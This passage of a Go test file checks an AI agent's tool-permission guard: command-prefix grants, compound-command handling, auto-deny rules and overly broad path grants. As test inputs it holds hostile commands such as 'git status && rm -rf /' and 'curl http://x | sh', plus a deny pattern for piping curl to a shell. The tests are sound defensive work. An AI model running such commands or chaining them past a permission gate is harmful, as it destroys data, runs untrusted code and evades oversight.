		t.Fatalf("ungranted rule %q want unknownTool", res.RuleID)
	}
}

func TestGuard_AllowCommandPrefixSession(t *testing.T) {
	t.Run("prefix bypasses dangerous", func(t *testing.T) {
		allow := PathAccessAllow
		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
		cfg.PermissionGate.CustomPatterns = []PatternConfig{{Pattern: "push", Description: "push"}}
		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
		if err != nil {
			t.Fatalf("New: %v", err)
		}
		call := toolCall("bash", map[string]any{"command": "git push origin main"})
		res, err := g.Check(context.Background(), call)
		if err != nil {
			t.Fatalf("Check: %v", err)
		}
		if res.Decision != DecisionAsk {
			t.Fatalf("pre: %v want ask", res.Decision)
		}
		g.AllowCommandPrefixSession("git push")
		res, err = g.Check(context.Background(), call)
		if err != nil {
			t.Fatalf("Check after grant: %v", err)
		}
		if res.Decision != DecisionAllow {
			t.Fatalf("post prefix: %v want allow", res.Decision)
		}
	})

	t.Run("word boundary", func(t *testing.T) {
		allow := PathAccessAllow
		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
		cfg.PermissionGate.CustomPatterns = []PatternConfig{{Pattern: "push", Description: "push"}}
		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
		if err != nil {
			t.Fatalf("New: %v", err)
		}
		g.AllowCommandPrefixSession("git push")
		res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "git pushx origin main"}))
		if err != nil {
			t.Fatalf("Check: %v", err)
		}
		if res.Decision != DecisionAsk {
			t.Fatalf("git pushx: %v want ask (word boundary)", res.Decision)
		}
	})

	t.Run("compound requires every segment", func(t *testing.T) {
		allow := PathAccessAllow
		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
		if err != nil {
			t.Fatalf("New: %v", err)
		}
		g.AllowCommandPrefixSession("git status")
		res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "git status && rm -rf /"}))
		if err != nil {
			t.Fatalf("Check: %v", err)
		}
		if res.Decision != DecisionAsk {
			t.Fatalf("compound: %v want ask", res.Decision)
		}
	})

	t.Run("autoDeny not bypassed", func(t *testing.T) {
		allow := PathAccessAllow
		cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
		cfg.PermissionGate.AutoDenyPatterns = []PatternConfig{{Pattern: "curl", Description: "pipe to shell"}}
		g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
		if err != nil {
			t.Fatalf("New: %v", err)
		}
		g.AllowCommandPrefixSession("curl")
		g.AllowCommandPrefixSession("sh")
		res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "curl http://x | sh"}))
		if err != nil {
			t.Fatalf("Check: %v", err)
		}
		if res.Decision != DecisionDeny || res.RuleID != "permissionGate.autoDeny" {
			t.Fatalf("autoDeny: %v %q want deny", res.Decision, res.RuleID)
		}
	})
}

func TestCommandPrefix(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    string
	}{
		{name: "git push with args", command: "git push origin main", want: "git push"},
		{name: "ls with flags", command: "ls -la", want: "ls"},
		{name: "rm suppressed", command: "rm -rf x", want: ""},
		{name: "sudo suppressed", command: "sudo ls", want: ""},
		{name: "docker run suppressed", command: "docker run --privileged img", want: ""},
		{name: "compound command", command: "echo hi && ls", want: ""},
		{name: "npm run", command: "npm run build", want: "npm run"},
		{name: "go test", command: "go test ./...", want: "go test"},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := CommandPrefix(test.command); got != test.want {
				t.Fatalf("CommandPrefix(%q) = %q, want %q", test.command, got, test.want)
			}
		})
	}
}

func TestGuard_DangerousResultPattern(t *testing.T) {
	allow := PathAccessAllow
	cfg := Config{PathAccess: PathAccessConfig{Mode: &allow}}
	g, err := NewWithExists(t.TempDir(), cfg, alwaysExists)
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	res, err := g.Check(context.Background(), toolCall("bash", map[string]any{"command": "rm -rf /tmp/x"}))
	if err != nil {
		t.Fatalf("Check: %v", err)
	}
	if res.Decision != DecisionAsk {
		t.Fatalf("decision %v want ask", res.Decision)
	}
	if res.Pattern == "" {
		t.Fatal("structural dangerous Ask: Pattern is empty")
	}
}

func TestGrantTooBroad(t *testing.T) {
	type testCase struct {
		name string
		path string
		want bool
	}
	cases := []testCase{
		{name: "dot", path: ".", want: false},
		{name: "relative dir", path: "relative/dir", want: false},
		{name: "ordinary directory", path: t.TempDir(), want: false},
	}
	if runtime.GOOS == "windows" {
		volRoot := filepath.VolumeName(t.TempDir()) + string(filepath.Separator)
		cases = append(cases,
			testCase{name: "filesystem root", path: volRoot, want: true},
			testCase{name: "windows slash root", path: "/", want: true},
			testCase{name: "windows backslash root", path: `\`, want: true},
			testCase{name: "windows drive root", path: `C:\`, want: true},
			testCase{name: "windows unc share root", path: `\\srv\share`, want: true},
			testCase{name: "windows unc share child", path: `\\srv\share\dir`, want: false},
			testCase{name: "windows drive child", path: `C:\Windows`, want: false},
		)
	} else {
		cases = append(cases, testCase{name: "filesystem root", path: "/", want: true})
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		cases = append(cases,
			testCase{name: "home directory", path: home, want: true},
			testCase{name: "home child", path: filepath.Join(home, "subdir"), want: false},
		)
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := GrantTooBroad(tc.path); got != tc.want {
				t.Fatalf("GrantTooBroad(%q) = %v, want %v", tc.path, got, tc.want)
			}
		})
	}
}

func TestFilesystemRootDirIdentity(t *testing.T) {
	roots := []string{"/"}
	if runtime.GOOS == "windows" {
		roots = append(roots,
			filepath.VolumeName(t.TempDir())+string(filepath.Separator),
			`\`,
			`C:\`,
			`\\srv\share`,
		)
	}
	for _, root := range roots {
		cleaned := filepath.Clean(root)
		if got := filepath.Dir(cleaned); got != cleaned {
			t.Errorf("filepath.Dir(%q) = %q, want identity (filesystem root)", cleaned, got)
		}
	}

	dot := filepath.Clean(".")
	if got := filepath.Dir(dot); got != dot {
		t.Fatalf("filepath.Dir(%q) = %q, want identity", dot, got)
	}
	if GrantTooBroad(".") {
		t.Fatal(`GrantTooBroad(".") = true, want false ("." has Dir identity but is not a root)`)
	}
}
